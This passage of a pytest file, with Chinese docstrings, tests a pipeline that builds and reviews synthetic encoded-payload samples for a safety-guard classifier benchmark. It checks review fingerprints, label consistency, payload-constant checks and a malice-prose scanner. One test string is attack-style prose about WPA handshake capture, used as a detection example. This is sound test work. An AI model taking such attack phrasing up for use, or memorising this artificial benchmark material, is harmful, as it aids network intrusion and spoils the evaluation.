    review = {"S1": _review_entry("S1", "unsafe S14", "MI-B", "0", sha="")}
    out = mod.resolve_reviewed_label("S1", "unsafe S14", "unsafe", review, SHA)
    assert out["ok"] is False and out["error"] == "unbound"


def test_review_bound_to_another_text_is_treated_as_unreviewed(mod):
    """指纹**不匹配**（复核是对**另一段文本**做的）⇒ 同样视为未复核。"""
    review = {"S1": _review_entry("S1", "unsafe S14", "MI-B", "0", sha="b" * 64)}
    out = mod.resolve_reviewed_label("S1", "unsafe S14", "unsafe", review, SHA)
    assert out["ok"] is False and out["error"] == "unbound"
    assert out["recorded"] == "b" * 64 and out["expected"] == SHA


def test_unbound_is_reported_before_a_verdict_conflict(mod):
    """指纹不符比判词不符**更根本** ⇒ 两者同时失败时报 `unbound`（指向真正的病根）。"""
    review = {"S1": _review_entry("S1", "unsafe S8", "MI-B", "0", sha="b" * 64)}
    out = mod.resolve_reviewed_label("S1", "unsafe S14", "unsafe", review, SHA)
    assert out["error"] == "unbound"


def test_text_sha256_is_a_required_argument(mod):
    """指纹是**必填**：不存在「调用方忘了传」而静默放行的路径。"""
    review = {"S1": _review_entry("S1", "unsafe S14", "MI-B", "0")}
    with pytest.raises(TypeError):
        mod.resolve_reviewed_label("S1", "unsafe S14", "unsafe", review)


def test_verdict_mismatch_is_rejected(mod):
    """复核表记录的判词与本次判词不符 ⇒ 说明复核是对另一次判词做的，不可混用。"""
    review = {"S1": _review_entry("S1", "unsafe S8", "MI-B", "0")}
    out = mod.resolve_reviewed_label("S1", "unsafe S14", "unsafe", review, SHA)
    assert out["ok"] is False and out["error"] == "conflict"


def test_counted_reviewed_must_agree_with_the_label(mod):
    bad = {"S1": _review_entry("S1", "unsafe S14", "MI-B", "1")}
    assert mod.resolve_reviewed_label("S1", "unsafe S14", "unsafe", bad, SHA)["error"] == "inconsistent"
    bad2 = {"S1": _review_entry("S1", "unsafe S14", "MI-M", "0")}
    assert mod.resolve_reviewed_label("S1", "unsafe S14", "unsafe", bad2, SHA)["error"] == "inconsistent"
    bad3 = {"S1": _review_entry("S1", "unsafe S14", "MI-B", "yes")}
    assert mod.resolve_reviewed_label("S1", "unsafe S14", "unsafe", bad3, SHA)["error"] == "inconsistent"


def test_guard_fields_separate_detector_from_review(mod, cfg):
    """检测器原始判词与机械映射**另立列**，`mi_label` 一律承载复核值。"""
    fields = mod.GUARD_FIELDS
    assert "guard_verdict" in fields and "auto_label" in fields and "mi_label" in fields
    assert fields.index("guard_verdict") < fields.index("auto_label") < fields.index("mi_label")
    assert "counted" in fields and "judgment_path" in fields
    assert cfg["output"]["guard_review_csv"] == "benign_guard_review.csv"


def test_load_guard_review_raises_when_the_table_is_absent(mod, tmp_path):
    try:
        mod.load_guard_review(str(tmp_path / "nope.csv"))
    except mod.GuardReviewError as exc:
        assert exc.missing
    else:
        raise AssertionError("缺失复核表时未抛 GuardReviewError")


def test_load_guard_review_reads_rows_by_sample_id(mod, tmp_path):
    path = str(tmp_path / "review.csv")
    mod.write_csv(path, [_review_entry("S1", "unsafe S14", "MI-B", "0")],
                  list(_review_entry("x", "v", "l", "c").keys()))
    table = mod.load_guard_review(path)
    assert list(table) == ["S1"]
    assert table["S1"]["mi_label_reviewed"] == "MI-B"


# ---------------------------------------------------------------------------
# 回退轮 r3.3 起：`M1`–`M3` 三条机械可判判据（W3 的标注前检查固化而来）
# **回退轮 r4**：`M1`／`M3` 的范围按 `g3_precheck_v2.0` §5 对齐
# ---------------------------------------------------------------------------
def test_m1_flags_a_payload_constant_that_is_only_a_default_argument(mod, cfg):
    """§5 `F-2`：载荷常量**只作形参默认值**、从不被显式读取 ⇒ 判缺陷（「形参不算」）。"""
    text = ('PAYLOAD_TOKEN_BLOB = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo="\n\n\n'
            'def consume(blob: str = PAYLOAD_TOKEN_BLOB) -> int:\n'
            '    return len(blob)\n')
    defects = mod._payload_constant_defects(text, "base64")
    assert [d[0] for d in defects] == ["PAYLOAD_TOKEN_BLOB"]
    assert defects[0][1] - defects[0][2] <= 0


def test_m1_accepts_explicit_consumption(mod):
    text = ('PAYLOAD_TOKEN_BLOB = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo="\n\n\n'
            'def consume(blob: str) -> int:\n'
            '    return len(blob)\n\n\n'
            'SIZE = consume(PAYLOAD_TOKEN_BLOB)\n')
    assert mod._payload_constant_defects(text, "base64") == []


def test_m1_is_not_applicable_to_non_python_carriers(mod):
    """§4.4：`ast.parse` 失败 ⇒ `F-2` **不适用**（`None`），**不作缺陷**。

    r3.3 的「出现 ≥2 次」文本退化判据已被删除：实测它在真实侧**误报 55 条**
    （把 `IE_NAME` 这类普通常量判成「未被消费」）。
    """
    shell = "#!/bin/sh\nBANNER_ART='aa'\necho done\n"
    assert mod._payload_constant_defects(shell, "ascii_art") is None


def test_m1_uses_the_declared_encoding_type_not_a_generic_pattern(mod):
    """§5：`payloadish` 按**该样本声明的 `encoding_type`** 判，不用通用 `{20,}` 字母数字。

    `EXAMPLES = "普通散文……"` 在 `homoglyph` 声明下**不是**载荷（无 >127 字符）⇒ 不判缺陷；
    在 `hex` 声明下若恰含 ≥16 位连续十六进制，则**是**载荷（这正是 `BN-G3-0361` 的情形）。
    """
    prose = 'EXAMPLES = "This is ordinary prose about the build pipeline."\n'
    assert mod._payload_constant_defects(prose, "homoglyph") == []
    hexish = 'EXAMPLES = "deadbeefdeadbeefdeadbeef plain words"\n'
    assert [d[0] for d in mod._payload_constant_defects(hexish, "hex")] == ["EXAMPLES"]


def test_m2_detects_an_art_block_and_rejects_plaintext(mod):
    art = ("#### |#### | ### \n"
           "#   #|#   #|#   #\n")
    assert mod._has_art_block(art)
    assert not mod._has_art_block('BANNER_ART = "PROSEWARE EDGE BUILD 3.4.1"\n')


def test_m3_form_count_rejects_a_misidentified_hex_sample(mod):
    """§5 `F-3` 的实例：全文只有 `50000000` 这样的 8 位片段 ⇒ 声明的 `hex` 不成立。"""
    assert mod._form_count("hex", "PREF=f1=50000000&v=abc") == 0
    assert mod._form_count("hex", 'EXPECTED_SHA256 = "87e9674125ed61deec7651409df1aa79"') == 1


def test_m3_morse_needs_space_separated_dot_dash_tokens(mod):
    """§5 `F-3`：`morse` = **空格分隔**的点划 token 序列（≥4 token，且至少一个含 `.`）。

    两个**错口径**的实例在此固化：① 长横线分隔行（`-` 恰是字母 `T`）不是 morse；
    ② 双空格分隔的文档串示例不是（`[ \\t]+` 的宽松分隔是错的 —— 这正是 `BN-G3-1106`）。
    """
    assert mod._form_count("morse", "# - - - - - - - - - - - - -\n") == 0
    assert mod._form_count("morse", "    .--.  -.--  -  ....  ---  -.\n") == 0
    assert mod._form_count("morse", "self.morse_edit.setText('- .. -. -.- . .-. ..-. --- .-. --. .')") >= 1


def test_m3_form_counts_cover_the_shapes_w3_listed(mod):
    for enc in ("hex", "base64", "morse", "url", "zerowidth", "homoglyph", "ascii_art"):
        assert enc in mod._FORM_COUNTS
    # 密文与明文同形 ⇒ 记 n/a，不虚设判据（§4.3）
    assert mod._form_count("rot13", "anything") is None
    assert mod._form_count("reverse", "anything") is None


def test_evidence_is_unique_per_sample(mod, cfg):
    """`S-2`：机制句可场景级，但**逐条实例坐标**须使字段在样本间唯一。"""
    rows, _ = mod.build_g3_synth(cfg, lambda _s: None)
    evidence = [r["business_necessity_evidence"] for r in rows]
    assert len(set(evidence)) == len(evidence)
    assert all("【本样本】" in e for e in evidence)


def test_r3_assertions_pass_on_a_freshly_built_set(mod, cfg):
    rows, _ = mod.build_g3_synth(cfg, lambda _s: None)
    result = mod.run_r3_assertions(rows, cfg)
    for key in ("M1", "M2", "M3"):
        assert result[key]["passed"], (key, result[key])


def test_m1_counts_are_measured_not_declared(mod, cfg):
    """往某个代码载体里塞一个**未被消费**的载荷常量 ⇒ `M1` 的实算必须跟着 +1（非写死）。"""
    rows, _ = mod.build_g3_synth(cfg, lambda _s: None)
    base = mod.run_r3_assertions(rows, cfg)["M1"]["violation_count"]
    assert base == 0
    victim = sorted([r for r in rows
                     if r["carrier_type"] == "code" and r["encoding_type"] == "base64"],
                    key=lambda r: r["source_item_id"])[0]
    victim["text"] = (victim["text"] + "\n\n\n"
                      'UNCONSUMED_BLOB = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo="\n')
    assert mod.run_r3_assertions(rows, cfg)["M1"]["violation_count"] == base + 1


# ---------------------------------------------------------------------------
# 自审轮 r6：`r6.2` 七条（A–G）＋ `r6.8` 反事实必要性
# ---------------------------------------------------------------------------
def test_r6_assertions_pass_on_a_freshly_built_set(mod, cfg):
    """20 个情境的构造须一次通过 `r6` 的全部八条断言（`N0`／`N1`／`E`／`B`／`C`／`D`／`G`）。"""
    rows, _ = mod.build_g3_synth(cfg, lambda _s: None)
    result = mod.run_r6_assertions(rows, cfg)
    for key in ("N0", "N1", "E", "B", "C", "D", "G"):
        assert result[key]["passed"], (key, result[key]["violations"][:3])


def test_n0_flags_a_verify_that_leaves_the_sandbox(mod):
    """`r6.8`：`verify` 只许用白名单原语 —— 引用 `os` 这类**模块对象**必须被查出。"""
    def bad(value):
        return value == os.getcwd()          # noqa: F821 - 故意越界，用于验证静态检查
    violations, captured, visited = mod._sandbox_audit(bad)
    assert "os" in violations and "getcwd" in violations


def test_n0_accepts_a_whitelisted_verify(mod):
    fn = mod._verify_morse("INGESTBUILD0.9.7")
    violations, _captured, _visited = mod._sandbox_audit(fn)
    assert violations == []


def test_unrelated_replacement_keeps_length_and_charset(mod):
    """`r6.8` 第 2 条：替换串**同长度、同字符集**，且与原值不同。"""
    value = mod._b64(b"release notes for the widget" * 2)
    rep = mod._unrelated_replacement(value, "base64", "seed-1")
    assert len(rep) == len(value) and rep != value
    assert set(rep) <= set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=")
    assert mod._unrelated_replacement(value, "base64", "seed-1") == rep      # 确定性


def test_unrelated_replacement_keeps_the_data_uri_shell(mod):
    uri = "data:image/svg+xml;base64," + mod._b64(b"<svg></svg>")
    rep = mod._unrelated_replacement(uri, "base64", "seed-2")
    assert rep.startswith("data:image/svg+xml;base64,")     # 结构性外壳保留
    assert rep != uri


def test_n1_fails_when_the_host_stops_depending_on_the_value(mod, cfg):
    """把某个情境的 `verify` 换成**恒真** ⇒ 替换串也会通过 ⇒ `N1` 必须判缺陷。"""
    rows, _ = mod.build_g3_synth(cfg, lambda _s: None)
    assert mod.run_r6_assertions(rows, cfg)["N1"]["passed"] is True
    for row in rows[:30]:
        row["_verify"] = lambda _v: True
    assert mod.run_r6_assertions(rows, cfg)["N1"]["violation_count"] == 30


def test_e_rejects_a_value_whose_type_mismatches_the_form(mod):
    """`r6.3`：声明「完整性与校验值」却给一个人可读短语 ⇒ 判缺陷。"""
    assert mod._form_value_ok("完整性与校验值", "hex", "contoso-release-manifest-v3", None) is False
    assert mod._form_value_ok("完整性与校验值", "hex", "a" * 40, None) is True
    # 声明「国际化转义串」却解出纯 ASCII ⇒ 判缺陷
    assert mod._form_value_ok("国际化转义串", "url", "Your%20workspace%20is%20ready.", "Your workspace is ready.") is False
    assert mod._form_value_ok("国际化转义串", "url", "%E4%BD%A0%E5%A5%BD", "你好") is True
    # 声明「序列化字段」却解不出 JSON ⇒ 判缺陷
    assert mod._form_value_ok("序列化字段", "base64", "QUJD", "ABC") is False
    assert mod._form_value_ok("序列化字段", "base64", "e30=", "{}") is True


def test_c_rejects_a_position_outside_the_forms_allowed_set(mod):
    allowed = mod._FORM_ALLOWED_POSITIONS["令牌与凭据表达"]
    assert "HTTP 头值" in allowed
    assert "注释/装饰块" not in allowed          # 正是第一轮 `D` 的失败形态（JWT 放进横幅）


def test_d_flags_placeholder_values(mod):
    low = "placeholder token for your service"
    assert any(mk in low for mk in mod._PLACEHOLDER_MARKERS)
    good = "authentic session fixture for the gateway"
    assert not any(mk in good for mk in mod._PLACEHOLDER_MARKERS)


def test_g_flags_attack_prose_and_clears_benign_code(mod, cfg):
    """`r6.2 G`：**动作 + 对象**短语命中；良性代码里的同名**名词**不得误伤。"""
    fams = cfg["g3_malice_scan"]["families"]
    benign = "csrf = self._html_search_regex(r'name=\"csrf\" value=\"(.+?)\"', page, 'csrf token')"
    attack = "configure the WPA handshake capture and select the target network before the attack"
    def hit(text):
        return any(re.search(f["regex"], text) for f in fams)
    assert not hit(benign)
    assert hit(attack)


def test_docstring_only_detects_example_values(mod):
    """`r6.8 N2`：只在 docstring 里当**示例**的载荷不构成消费。"""
    doc = '"""\n>>> md5("a")\n[Row(hash=u\'902fbdd2b1df0c4f70b4a5d23525e932\')]\n"""\n'
    assert mod._docstring_only(doc, "完整性与校验值", "hex") is True
    code = 'EXPECTED = "902fbdd2b1df0c4f70b4a5d23525e932"\nassert md5_of(b"a") == EXPECTED\n'
    assert mod._docstring_only(code, "完整性与校验值", "hex") is False


def test_form_allowed_shapes_matches_the_implementation(mod, cfg):
    """`r6.8` 末段：11 形态的**允许形态**须落盘，且与实现逐项一致（`C0` 已校验）。"""
    shapes = cfg["form_allowed_shapes"]
    assert sorted(shapes) == sorted(cfg["allowed_business_forms"])
    for form, spec in shapes.items():
        assert spec["positions"] == list(mod._FORM_ALLOWED_POSITIONS[form])
        assert spec["shapes"] and spec["consumer_primitives"]
